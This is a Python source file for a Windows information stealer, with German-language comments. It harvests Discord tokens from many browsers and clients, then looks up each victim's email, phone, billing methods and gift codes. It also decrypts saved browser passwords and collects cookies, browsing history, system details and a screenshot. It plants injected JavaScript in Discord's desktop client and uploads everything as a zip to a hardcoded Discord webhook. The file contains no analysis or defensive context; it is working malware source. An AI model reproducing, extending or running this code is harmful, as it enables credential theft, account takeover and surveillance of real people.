import os
import json
import uuid
import psutil
import base64
import sqlite3
import shutil
import zipfile
import tempfile
from datetime import datetime, timedelta
import socket
import getpass
import wmi
import browser_cookie3
from Crypto.Cipher import AES
import win32crypt
import requests
from io import BytesIO
import pyautogui
import re
from threading import Thread
from urllib3 import PoolManager
from urllib3.response import HTTPResponse
import pyaes

WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1395901453511692500/EndoBEL5jEHHcwhPqXdrSksh03RjXwIY4yD1EpcOi7_YBl2Pcz1hnfxLfyU0MfHbLkye"

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data\\Default',
    'edge': appdata + '\\Microsoft\\Edge\\User Data\\Default',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
}

class Discord:
    httpClient = PoolManager(cert_reqs="CERT_NONE")
    ROAMING = os.getenv("appdata")
    LOCALAPPDATA = os.getenv("localappdata")
    REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
    REGEX_ENC = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

    @staticmethod
    def GetHeaders(token: str = None) -> dict:
        headers = {
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }
        if token:
            headers["authorization"] = token
        return headers

    @staticmethod
    def GetTokens() -> list[dict]:
        results: list[dict] = list()
        tokens: list[dict] = list()
        threads: list[Thread] = list()

        paths = {
            "Discord": os.path.join(Discord.ROAMING, "discord"),
            "Discord Canary": os.path.join(Discord.ROAMING, "discordcanary"),
            "Lightcord": os.path.join(Discord.ROAMING, "Lightcord"),
            "Discord PTB": os.path.join(Discord.ROAMING, "discordptb"),
            "Opera": os.path.join(Discord.ROAMING, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(Discord.ROAMING, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(Discord.LOCALAPPDATA, "Amigo", "User Data"),
            "Torch": os.path.join(Discord.LOCALAPPDATA, "Torch", "User Data"),
            "Kometa": os.path.join(Discord.LOCALAPPDATA, "Kometa", "User Data"),
            "Orbitum": os.path.join(Discord.LOCALAPPDATA, "Orbitum", "User Data"),
            "CentBrowse": os.path.join(Discord.LOCALAPPDATA, "CentBrowser", "User Data"),
            "7Sta": os.path.join(Discord.LOCALAPPDATA, "7Star", "7Star", "User Data"),
            "Sputnik": os.path.join(Discord.LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"),
            "Vivaldi": os.path.join(Discord.LOCALAPPDATA, "Vivaldi", "User Data"),
            "Chrome SxS": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome SxS", "User Data"),
            "Chrome": os.path.join(Discord.LOCALAPPDATA, "Google", "Chrome", "User Data"),
            "FireFox": os.path.join(Discord.ROAMING, "Mozilla", "Firefox", "Profiles"),
            "Epic Privacy Browse": os.path.join(Discord.LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": os.path.join(Discord.LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
            "Uran": os.path.join(Discord.LOCALAPPDATA, "uCozMedia", "Uran", "User Data"),
            "Yandex": os.path.join(Discord.LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
            "Brave": os.path.join(Discord.LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
            "Iridium": os.path.join(Discord.LOCALAPPDATA, "Iridium", "User Data"),
        }

        for name, path in paths.items():
            if os.path.isdir(path):
                if name == "FireFox":
                    t = Thread(target=lambda: tokens.extend([{"token": t, "source": "Firefox"} for t in Discord.FireFoxSteal(path) or []]))
                    t.start()
                    threads.append(t)
                else:
                    t = Thread(target=lambda: tokens.extend([{"token": t, "source": f"{name} (Encrypted)"} for t in Discord.SafeStorageSteal(path) or []]))
                    t.start()
                    threads.append(t)
                    t = Thread(target=lambda: tokens.extend([{"token": t, "source": f"{name} (Unencrypted)"} for t in Discord.SimpleSteal(path) or []]))
                    t.start()
                    threads.append(t)

        for thread in threads:
            thread.join()

        # Deduplizieren, aber alle Quellen für denselben Token behalten
        token_dict = {}
        for token_data in tokens:
            token = token_data["token"]
            source = token_data["source"]
            if token not in token_dict:
                token_dict[token] = []
            if source not in token_dict[token]:
                token_dict[token].append(source)

        for token, sources in token_dict.items():
            r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers=Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors="ignore")
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified = r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {
                    0: 'No Nitro',
                    1: 'Nitro Classic',
                    2: 'Nitro',
                    3: 'Nitro Basic'
                }
                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors="ignore"))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)
                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1
                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors="ignore")
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({
                    'USERNAME': user,
                    'USERID': id,
                    'MFA': mfa,
                    'EMAIL': email,
                    'PHONE': phone,
                    'VERIFIED': verified,
                    'NITRO': nitro_data,
                    'BILLING': billing,
                    'TOKEN': token,
                    'GIFTS': gifts,
                    'SOURCE': ', '.join(sources)  # Kombiniere alle Quellen
                })

        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]:
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()

        localStatePath = os.path.join(path, "Local State")

        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == "leveldb":
                    levelDbPaths.append(os.path.join(root, dir))

        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors="ignore") as file:
                jsonContent: dict = json.load(file)
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith((".log", ".ldb")):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors="ignore") as file:
                            lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip("\\")
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split("dQw4w9WgXcQ:")[1].encode())
                                        encryptedTokens.append(match)
        
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(win32crypt.CryptUnprotectData(key, None, None, None, 0)[1], token[3:15]).decrypt(token[15:])[:-16].decode(errors="ignore")
                if token:
                    tokens.append(token)
            except Exception:
                pass
        
        return tokens

    @staticmethod
    def SimpleSteal(path: str) -> list[str]:
        tokens = list()
        levelDbPaths = list()

        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == "leveldb":
                    levelDbPaths.append(os.path.join(root, dir))

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)
        
        return tokens

    @staticmethod
    def FireFoxSteal(path: str) -> list[str]:
        tokens = list()
        for root, _, files in os.walk(path):
            for file in files:
                if file.lower().endswith(".sqlite"):
                    filepath = os.path.join(root, file)
                    with open(filepath, errors="ignore") as file:
                        lines = file.readlines()
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX, line)
                                for match in matches:
                                    match = match.rstrip("\\")
                                    if not match in tokens:
                                        tokens.append(match)
        return tokens

    @staticmethod
    def InjectJs() -> str | None:
        check = False
        try:
            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors="ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(WEBHOOK_URL.encode()).decode(errors="ignore")))
        except Exception:
            return None
        
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

def log_error(message):
    try:
        with open("error_log.txt", "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()}: {message}\n")
    except:
        pass

def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=chromedate))
        except:
            return str(chromedate)
    return ""

def get_encryption_key(browser_path, browser_name):
    local_state_path = os.path.join(os.path.dirname(browser_path), "Local State")
    temp_dir = tempfile.gettempdir()
    temp_local_state = os.path.join(temp_dir, f"LocalState_{browser_name}")
    
    try:
        shutil.copy2(local_state_path, temp_local_state)
        with open(temp_local_state, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        os.remove(temp_local_state)
        return decrypted_key
    except Exception as e:
        log_error(f"Fehler beim Abrufen des Verschlüsselungsschlüssels für {browser_name}: {str(e)}")
        if os.path.exists(temp_local_state):
            os.remove(temp_local_state)
        return None

def decrypt_data(buff, key):
    try:
        if len(buff) < 15:
            return ""
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_data = cipher.decrypt(payload)[:-16].decode()
        return decrypted_data
    except:
        return ""

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        temp_dir = tempfile.gettempdir()
        screenshot_path = os.path.join(temp_dir, f"desktop_screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        screenshot.save(screenshot_path)
        return screenshot_path
    except Exception as e:
        log_error(f"Fehler beim Erstellen des Screenshots: {str(e)}")
        return None

def get_system_info():
    system_info = []
    try:
        # Get username
        try:
            username = os.getlogin()
        except AttributeError:
            username = getpass.getuser()
        system_info.append(f"Username: {username}")

        # Get hostname
        system_info.append(f"Hostname: {socket.gethostname()}")

        # Get IP address
        try:
            ip_response = requests.get('https://api.ipify.org?format=json', timeout=5)
            system_info.append(f"IP Address: {ip_response.json().get('ip', 'Unknown')}")
        except Exception as e:
            system_info.append(f"IP Address: Unknown (Error: {str(e)})")

        # Get CPU and GPU information
        try:
            c = wmi.WMI()
            for processor in c.Win32_Processor():
                system_info.append(f"CPU: {processor.Name}")
                breakdef
            for gpu in c.Win32_VideoController():
                system_info.append(f"GPU: {gpu.Name}")
                break
        except Exception as e:
            system_info.append(f"CPU/GPU Info: Unknown (Error: {str(e)})")

        # Get Hardware ID (HWID)
        try:
            hwid = str(uuid.getnode())  # Uses MAC address as a base for HWID
            system_info.append(f"HWID: {hwid}")
        except Exception as e:
            system_info.append(f"HWID: Unknown (Error: {str(e)})")

        # Get MAC address
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)][::-1])
            system_info.append(f"MAC Address: {mac}")
        except Exception as e:
            system_info.append(f"MAC Address: Unknown (Error: {str(e)})")

        # Get RAM information
        try:
            ram = psutil.virtual_memory()
            total_ram = round(ram.total / (1024 ** 3), 2)  # Convert bytes to GB
            system_info.append(f"Total RAM: {total_ram} GB")
        except Exception as e:
            system_info.append(f"Total RAM: Unknown (Error: {str(e)})")

    except Exception as e:
        system_info.append(f"General Error: {str(e)}")

    return "\n".join(system_info)

def extract_discord_cookie_tokens(browser_name, browser_func):
    token_data = []
    try:
        cookies = browser_func(domain_name='discord.com')
        for cookie in cookies:
            if cookie.name == 'token' and len(cookie.value) > 20:
                token_data.append({
                    'USERNAME': 'Unknown (Cookie)',
                    'USERID': 'Unknown (Cookie)',
                    'MFA': 'Unknown (Cookie)',
                    'EMAIL': 'Unknown (Cookie)',
                    'PHONE': 'Unknown (Cookie)',
                    'VERIFIED': 'Unknown (Cookie)',
                    'NITRO': 'Unknown (Cookie)',
                    'BILLING': 'Unknown (Cookie)',
                    'TOKEN': cookie.value,
                    'GIFTS': 'Gift Codes: (NONE)',
                    'SOURCE': f"{browser_name} (Cookie)"
                })
        if not token_data:
            log_error(f"Keine Discord-Tokens in {browser_name} Cookies gefunden")
        return token_data
    except Exception as e:
        log_error(f"Fehler beim Extrahieren von {browser_name} Cookies: {str(e)}")
        return []

def format_discord_data(discord_data):
    lines = ["Discord Tokens:"]
    for item in discord_data:
        lines.append(f"Source: {item['SOURCE']}")
        lines.append(f"Username: {item['USERNAME']}")
        lines.append(f"UserID: {item['USERID']}")
        lines.append(f"Email: {item['EMAIL']}")
        lines.append(f"Phone: {item['PHONE']}")
        lines.append(f"Verified: {item['VERIFIED']}")
        lines.append(f"MFA Enabled: {item['MFA']}")
        lines.append(f"Nitro: {item['NITRO']}")
        lines.append(f"Billing: {item['BILLING']}")
        lines.append(f"Token: {item['TOKEN']}")
        lines.append(f"{item['GIFTS']}")
        lines.append("-" * 50)
    return "\n".join(lines) if len(lines) > 1 else "No Discord tokens found"

def create_and_send_zip(hostname, data_dict, discord_data):
    try:
        zip_buffer = BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.writestr("system/system_info.txt", data_dict["system_info"])
            
            screenshot_path = take_screenshot()
            if screenshot_path and os.path.exists(screenshot_path):
                zip_file.write(screenshot_path, "system/desktop_screenshot.png")
                os.remove(screenshot_path)
            
            for browser, data_types in data_dict.items():
                if browser == "system_info":
                    continue
                for data_type, data in data_types.items():
                    if data and data_type not in ["discord_cookie_tokens"]:
                        text_data = format_browser_data(data_type, data)
                        zip_file.writestr(f"browser/{browser}/{data_type}/{data_type}.txt", text_data)
            
            # Kombinierte Tokens aus Discord-Klasse und Browser-Cookies
            all_tokens = discord_data
            for browser, data_types in data_dict.items():
                if browser == "system_info":
                    continue
                if "discord_cookie_tokens" in data_types:
                    all_tokens.extend(data_types["discord_cookie_tokens"])
            
            text_data = format_discord_data(all_tokens)
            zip_file.writestr("discord/token.txt", text_data)
        
        zip_buffer.seek(0)
        zip_name = f"coco_{hostname}.zip"
        files = {
            'file': (zip_name, zip_buffer, 'application/zip')
        }
        payload = {"content": f"Data from {hostname}"}
        for attempt in range(2):
            try:
                response = requests.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files=files, timeout=10)
                if response.status_code in [200, 204]:
                    return
                log_error(f"Webhook-Upload Versuch {attempt+1} fehlgeschlagen: Status {response.status_code}, Antwort: {response.text}")
            except Exception as e:
                log_error(f"Webhook-Upload Versuch {attempt+1} fehlgeschlagen: {str(e)}")
    except Exception as e:
        log_error(f"Fehler beim Erstellen/Senden der ZIP-Datei: {str(e)}")

def extract_cookies(browser_name, browser_func):
    try:
        cookies = browser_func()
        cookie_data = []
        for cookie in cookies:
            cookie_data.append({
                "domain": cookie.domain,
                "name": cookie.name,
                "value": cookie.value
            })
        return cookie_data
    except Exception as e:
        log_error(f"Fehler beim Extrahieren von {browser_name} Cookies: {str(e)}")
        return []

def extract_history(browser_path, browser_name):
    history_db = os.path.join(browser_path, "History")
    temp_dir = tempfile.gettempdir()
    temp_history_db = os.path.join(temp_dir, f"temp_history_{browser_name}.db")
    
    try:
        shutil.copy2(history_db, temp_history_db)
        conn = sqlite3.connect(temp_history_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
        history_data = []
        for row in cursor.fetchall():
            url, title, visit_time = row
            visit_time = get_chrome_datetime(visit_time) if browser_name != "firefox" else str(datetime.fromtimestamp(visit_time / 1000000))
            history_data.append({
                "url": url,
                "title": title,
                "last_visit_time": visit_time
            })
        conn.close()
        os.remove(temp_history_db)
        return history_data
    except Exception as e:
        log_error(f"Fehler beim Extrahieren von {browser_name} Verlauf: {str(e)}")
        if os.path.exists(temp_history_db):
            os.remove(temp_history_db)
        return []

def extract_passwords(browser_path, browser_name):
    login_db = os.path.join(browser_path, "Login Data")
    temp_dir = tempfile.gettempdir()
    temp_login_db = os.path.join(temp_dir, f"temp_login_{browser_name}.db")
    
    try:
        shutil.copy2(login_db, temp_login_db)
        key = get_encryption_key(browser_path, browser_name)
        if not key:
            log_error(f"Kein Verschlüsselungsschlüssel für {browser_name} gefunden")
            return []
        conn = sqlite3.connect(temp_login_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        password_data = []
        for row in cursor.fetchall():
            url, username, password = row
            if password:
                password = decrypt_data(password, key)
            password_data.append({
                "url": url,
                "username": username,
                "password": password
            })
        conn.close()
        os.remove(temp_login_db)
        return password_data
    except Exception as e:
        log_error(f"Fehler beim Extrahieren von {browser_name} Passwörtern: {str(e)}")
        if os.path.exists(temp_login_db):
            os.remove(temp_login_db)
        return []

def extract_firefox_passwords(firefox_path):
    profile = [p for p in os.listdir(firefox_path) if p.endswith(".default-release")]
    if not profile:
        return []
    profile_path = os.path.join(firefox_path, profile[0])
    logins_file = os.path.join(profile_path, "logins.json")
    if not os.path.exists(logins_file):
        return []
    try:
        with open(logins_file, "r", encoding="utf-8") as f:
            logins = json.load(f)
        password_data = []
        for login in logins.get("logins", []):
            password_data.append({
                "url": login.get("hostname", ""),
                "username": login.get("username", ""),
                "password": login.get("password", "")
            })
        return password_data
    except Exception as e:
        log_error(f"Fehler beim Extrahieren von Firefox Passwörtern: {str(e)}")
        return []

def format_browser_data(data_type, data):
    lines = []
    if data_type == "cookies":
        lines.append("Cookies:")
        for item in data:
            lines.append(f"Domain: {item['domain']}")
            lines.append(f"Name: {item['name']}")
            lines.append(f"Value: {item['value']}")
            lines.append("-" * 50)
    elif data_type == "history":
        lines.append("History:")
        for item in data[:100]:
            lines.append(f"URL: {item['url']}")
            lines.append(f"Title: {item['title']}")
            lines.append(f"Last Visit: {item['last_visit_time']}")
            lines.append("-" * 50)
    elif data_type == "passwords":
        lines.append("Passwords:")
        for item in data:
            lines.append(f"URL: {item['url']}")
            lines.append(f"Username: {item['username']}")
            lines.append(f"Password: {item['password']}")
            lines.append("-" * 50)
    return "\n".join(lines) if lines else f"No {data_type} found in {', '.join(browsers.keys())}"

def main():
    try:
        hostname = socket.gethostname()
    except Exception as e:
        hostname = "unknown_host"
        log_error(f"Fehler beim Abrufen des Hostnamens: {str(e)}")

    data_dict = {}
    data_dict["system_info"] = get_system_info()

    try:
        discord_data = Discord.GetTokens()
    except Exception as e:
        log_error(f"Fehler beim Extrahieren von Discord-Tokens mit Discord-Klasse: {str(e)}")
        discord_data = []

    for browser, path in browsers.items():
        data_dict[browser] = {
            "cookies": extract_cookies(browser, getattr(browser_cookie3, browser.replace("-", "_"))),
            "history": extract_history(path, browser),
            "passwords": extract_firefox_passwords(path) if browser == "firefox" else extract_passwords(path, browser),
            "discord_cookie_tokens": extract_discord_cookie_tokens(browser, getattr(browser_cookie3, browser.replace("-", "_")))
        }

    create_and_send_zip(hostname, data_dict, discord_data)

if __name__ == "__main__":
    main()